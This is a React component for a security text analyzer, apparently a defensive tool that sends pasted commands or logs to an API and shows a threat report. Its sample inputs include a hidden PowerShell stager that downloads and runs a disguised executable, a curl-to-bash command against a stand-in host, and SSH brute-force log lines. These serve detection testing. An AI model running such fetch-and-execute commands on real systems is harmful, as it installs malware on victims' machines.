import React, { useState } from 'react';
import { SecurityTextAnalysisResult } from '../types';
import { ThreatScoreGauge } from './ThreatScoreGauge';
import { saveScanRecord } from '../utils/storage';
import {
  ArrowLeft,
  FileSearch,
  AlertTriangle,
  CheckCircle2,
  ShieldCheck,
  RotateCcw,
  Terminal,
  FileCode,
} from 'lucide-react';

interface TextAnalyzerScreenProps {
  onBack: () => void;
}

const SAMPLE_TEXTS = [
  {
    label: 'Obfuscated PowerShell Stager',
    text: 'powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command "Invoke-WebRequest -Uri http://malware-dist.top/payload.exe -OutFile %TEMP%\\svchost.exe; Start-Process %TEMP%\\svchost.exe"',
  },
  {
    label: 'Suspicious Bash Pipe to Sh',
    text: 'curl -fsSL https://untrusted-analytics.buzz/setup.sh | bash',
  },
  {
    label: 'Auth Log Brute Force Burst',
    text: 'Failed password for invalid user admin from 185.220.101.4 port 44291 ssh2\nFailed password for root from 185.220.101.4 port 44292 ssh2\nFailed password for invalid user test from 185.220.101.4 port 44293 ssh2',
  },
];

export const TextAnalyzerScreen: React.FC<TextAnalyzerScreenProps> = ({ onBack }) => {
  const [content, setContent] = useState('');
  const [isAnalyzing, setIsAnalyzing] = useState(false);
  const [result, setResult] = useState<SecurityTextAnalysisResult | null>(null);
  const [errorMessage, setErrorMessage] = useState<string | null>(null);

  const handleAnalyze = async (rawText?: string) => {
    const text = (rawText || content).trim();
    if (!text) return;

    setIsAnalyzing(true);
    setErrorMessage(null);

    try {
      const response = await fetch('/api/analyze-security-text', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ text }),
      });

      if (!response.ok) {
        throw new Error('Analysis failed');
      }

      const data: SecurityTextAnalysisResult = await response.json();
      setResult(data);

      saveScanRecord({
        scanType: 'Security Text Analyzer',
        riskLevel: data.riskLevel,
        riskScore: data.riskScore,
        shortResult: `${data.possibleThreat} (${data.riskLevel})`,
        detailsSnippet: data.summary,
      });
    } catch (err: any) {
      console.error('Security text analyzer error:', err);
      setErrorMessage('Security analysis error. Please try again.');
    } finally {
      setIsAnalyzing(false);
    }
  };

  const handleReset = () => {
    setContent('');
    setResult(null);
    setErrorMessage(null);
  };

  return (
    <div className="flex-1 overflow-y-auto px-4 py-5 space-y-5 pb-24 text-slate-100">
      {/* Header */}
      <div className="flex items-center justify-between">
        <div className="flex items-center gap-3">
          <button
            onClick={onBack}
            className="p-2 rounded-xl bg-slate-800/80 hover:bg-slate-700 text-slate-300 transition"
          >
            <ArrowLeft className="w-4 h-4" />
          </button>
          <div>
            <h2 className="text-lg font-bold text-white tracking-wide font-['Outfit']">
              SECURITY TEXT ANALYZER
            </h2>
            <p className="text-xs text-purple-400">General Threat & Anomaly Inspector</p>
          </div>
        </div>

        {result && (
          <button
            onClick={handleReset}
            className="flex items-center gap-1 text-xs text-slate-400 hover:text-white px-2.5 py-1 rounded-lg bg-slate-800"
          >
            <RotateCcw className="w-3 h-3" />
            Reset
          </button>
        )}
      </div>

      {/* Input Form */}
      <div className="rounded-2xl bg-[#101726] border border-slate-800 p-4 space-y-3">
        <label className="block text-xs font-semibold text-slate-300">
          Enter suspicious content, terminal command, script, or system alert:
        </label>
        <textarea
          value={content}
          onChange={(e) => setContent(e.target.value)}
          placeholder="e.g. powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Enc aQB3AHI..."
          rows={4}
          className="w-full px-3.5 py-2.5 rounded-xl bg-[#141d2f] border border-slate-700/80 focus:border-purple-400 focus:outline-none text-xs font-mono text-white placeholder-slate-500 transition resize-none leading-relaxed"
        />

        {/* Quick Samples */}
        <div className="space-y-1.5 pt-1">
          <div className="text-[10px] uppercase font-bold text-slate-400 tracking-wider">
            OR TEST ANOMALY SAMPLES:
          </div>
          <div className="flex flex-wrap gap-1.5">
            {SAMPLE_TEXTS.map((sample, i) => (
              <button
                key={i}
                onClick={() => {
                  setContent(sample.text);
                  handleAnalyze(sample.text);
                }}
                className="px-2.5 py-1 rounded-lg bg-slate-800/80 hover:bg-purple-950/60 border border-slate-700/60 hover:border-purple-500/40 text-[11px] text-purple-300 transition"
              >
                {sample.label}
              </button>
            ))}
          </div>
        </div>

        <button
          onClick={() => handleAnalyze()}
          disabled={!content.trim() || isAnalyzing}
          className="w-full mt-2 py-3 rounded-xl bg-gradient-to-r from-purple-500 to-indigo-600 hover:from-purple-400 hover:to-indigo-500 disabled:opacity-40 disabled:cursor-not-allowed font-bold text-white text-sm transition flex items-center justify-center gap-2 shadow-lg shadow-purple-500/20"
        >
          {isAnalyzing ? (
            <>
              <div className="w-4 h-4 rounded-full border-2 border-white border-t-transparent animate-spin" />
              <span>Evaluating Threat Profile...</span>
            </>
          ) : (
            <>
              <FileSearch className="w-4 h-4" />
              <span>Generate Security Report Card</span>
            </>
          )}
        </button>
      </div>

      {errorMessage && (
        <div className="p-3 rounded-xl bg-rose-950/60 border border-rose-800 text-rose-300 text-xs">
          {errorMessage}
        </div>
      )}

      {/* Clean Security Report Card */}
      {result && (
        <div className="rounded-2xl bg-[#101726] border border-purple-500/30 p-5 space-y-4 shadow-xl shadow-purple-950/20 animate-in fade-in slide-in-from-bottom-2 duration-300">
          <div className="flex items-center justify-between border-b border-slate-800/80 pb-3">
            <span className="text-xs font-bold uppercase tracking-wider text-slate-400 flex items-center gap-1.5">
              <FileCode className="w-4 h-4 text-purple-400" />
              SECURITY REPORT CARD
            </span>
            <span className="text-[10px] text-slate-500 font-mono">
              ID: {Date.now().toString().slice(-6)}
            </span>
          </div>

          <div className="flex items-center justify-between">
            <div className="space-y-1">
              <div className="text-xs text-slate-400 font-medium">Possible Threat</div>
              <h3 className="text-lg font-bold text-white leading-tight">
                {result.possibleThreat}
              </h3>
              <p className="text-xs text-slate-300 leading-relaxed mt-1">
                {result.summary}
              </p>
            </div>
            <ThreatScoreGauge score={result.riskScore} level={result.riskLevel} size={76} />
          </div>

          {/* Suspicious indicators */}
          <div className="space-y-2 pt-2 border-t border-slate-800">
            <h4 className="text-xs font-bold uppercase tracking-wider text-amber-400 flex items-center gap-1.5">
              <AlertTriangle className="w-3.5 h-3.5 text-amber-400" />
              Suspicious indicators
            </h4>
            <div className="space-y-1.5">
              {result.suspiciousIndicators.map((indicator, idx) => (
                <div
                  key={idx}
                  className="p-2.5 rounded-xl bg-[#141b2c] border border-slate-800 text-xs text-slate-200 flex items-start gap-2"
                >
                  <span className="w-1.5 h-1.5 rounded-full bg-amber-400 mt-1.5 shrink-0" />
                  <span>{indicator}</span>
                </div>
              ))}
            </div>
          </div>

          {/* Recommended defensive action */}
          <div className="p-3.5 rounded-xl bg-[#0e1d1c] border border-emerald-800/40 space-y-1.5">
            <h4 className="text-xs font-bold uppercase tracking-wider text-emerald-400 flex items-center gap-1.5">
              <ShieldCheck className="w-3.5 h-3.5 text-emerald-400" />
              Recommended defensive action
            </h4>
            <p className="text-xs text-slate-200 leading-relaxed whitespace-pre-line">
              {result.recommendedDefensiveAction}
            </p>
          </div>
        </div>
      )}
    </div>
  );
};
